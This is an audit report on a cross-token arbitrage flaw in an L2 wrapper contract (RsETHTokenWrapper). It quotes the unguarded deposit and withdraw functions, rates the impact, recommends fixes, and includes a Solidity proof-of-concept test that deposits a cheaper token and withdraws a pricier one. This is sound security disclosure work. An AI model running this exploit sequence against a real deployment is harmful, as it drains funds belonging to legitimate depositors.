Audit Report

## Title
Cross-Token Arbitrage Drains Higher-Value Reserves via Unguarded Multi-Token Deposit/Withdraw — (`contracts/L2/RsETHTokenWrapper.sol`)

## Summary
`RsETHTokenWrapper` supports multiple allowed tokens and mints/burns wrsETH at a strict 1:1 ratio for any allowed token. Because `_deposit` and `_withdraw` perform no cross-token reserve accounting and no price-parity check, any unprivileged caller can deposit a lower-priced allowed token to receive wrsETH and immediately withdraw a higher-priced allowed token at the same nominal amount, extracting value from the wrapper and leaving it undercollateralized with respect to the higher-value asset.

## Finding Description
The contract explicitly supports multiple alt-rsETH tokens. `reinitialize` (L47–49) adds a second token via an admin upgrade, and `addAllowedToken` (L174–176) can add further tokens at any time under `TIMELOCK_ROLE`. Both paths are part of the intended design.

`_deposit` (L134–141) only verifies `allowedTokens[_asset]`, then unconditionally mints `_amount` wrsETH regardless of which token is deposited:

```solidity
function _deposit(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
    _mint(_to, _amount);
}
```

`_withdraw` (L120–128) only verifies `allowedTokens[_asset]`, then burns `_amount` wrsETH and transfers `_amount` of the *requested* token — with no constraint that it must be the same token that was deposited and no check that the wrapper holds sufficient reserves of that specific token:

```solidity
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
}
```

There is no per-token reserve accounting, no price oracle, and no restriction preventing a caller from depositing token-A and withdrawing token-B. The entire multi-token pool is treated as a single fungible bucket at 1:1 with wrsETH. The existing `TokenNotAllowed` guard is entirely insufficient — it only verifies the token is registered, not that reserves exist or that cross-token redemption is safe.

## Impact Explanation
**Critical — Direct theft of user funds / Protocol insolvency.**

When two allowed tokens trade at different market prices (e.g., altRsETH-A at 0.98 ETH and altRsETH-B at 1.00 ETH), an attacker extracts `N × (price_B − price_A)` per iteration. The wrapper's token-B reserves are fully drained while token-A accumulates. Remaining wrsETH holders who attempt to withdraw token-B find insufficient balance; the wrapper is insolvent with respect to the higher-value asset. This is direct theft of funds from legitimate depositors and matches the Critical impact class.

## Likelihood Explanation
**High.** The multi-token design is intentional — `reinitialize` was added specifically to introduce a second alt-rsETH token. L2 deployments routinely carry multiple bridge-issued versions of the same L1 token (native bridge vs. third-party bridge), and these routinely trade at a spread due to differing bridge risk and liquidity depth. No special privilege is required to execute the exploit once two tokens are registered; `deposit` and `withdraw` are fully public. The attack is atomic, repeatable, and requires no flash loan or oracle manipulation — only a market price spread between two registered tokens.

## Recommendation
1. **Per-token reserve accounting**: Track how much of each allowed token backs the outstanding wrsETH supply. On `_withdraw`, enforce that the wrapper's balance of the requested token is sufficient to cover the redemption independently of other token balances.
2. **Single-token redemption receipts**: Record which token each user deposited (per-user or per-deposit receipt) and restrict `_withdraw` to redeeming only the same token that was deposited.
3. **Price-parity guard**: If multi-token fungibility is intentional, integrate an on-chain oracle and reject deposits/withdrawals when the price spread between any two allowed tokens exceeds a configured threshold.

## Proof of Concept
```solidity
// Preconditions:
//   tokenA and tokenB are both in allowedTokens (via reinitialize or addAllowedToken)
//   tokenA.marketPrice = 0.98 ETH, tokenB.marketPrice = 1.00 ETH
//   Wrapper holds 1000 tokenB deposited by legitimate users

function testCrossTokenArbitrage() public {
    uint256 amount = 1000e18;
    tokenA.mint(attacker, amount); // costs ~980 ETH equivalent at market

    vm.startPrank(attacker);

    // Step 1: deposit cheap tokenA → mint 1000 wrsETH at 1:1
    tokenA.approve(address(wrapper), amount);
    wrapper.deposit(address(tokenA), amount);
    // wrapper: 1000 tokenA + 1000 tokenB, wrsETH supply = 2000

    // Step 2: withdraw expensive tokenB → burn 1000 wrsETH, receive 1000 tokenB
    wrapper.withdraw(address(tokenB), amount);
    // wrapper: 1000 tokenA + 0 tokenB, wrsETH supply = 1000
    // All remaining wrsETH backed only by tokenA (~980 ETH) → insolvency

    vm.stopPrank();

    assertEq(tokenB.balanceOf(address(wrapper)), 0);
    assertGt(wrapper.totalSupply(), tokenB.balanceOf(address(wrapper)));
}
```

Root cause confirmed at `contracts/L2/RsETHTokenWrapper.sol` lines 120–128 (`_withdraw`) and 134–141 (`_deposit`): no cross-token reserve guard exists at either call site.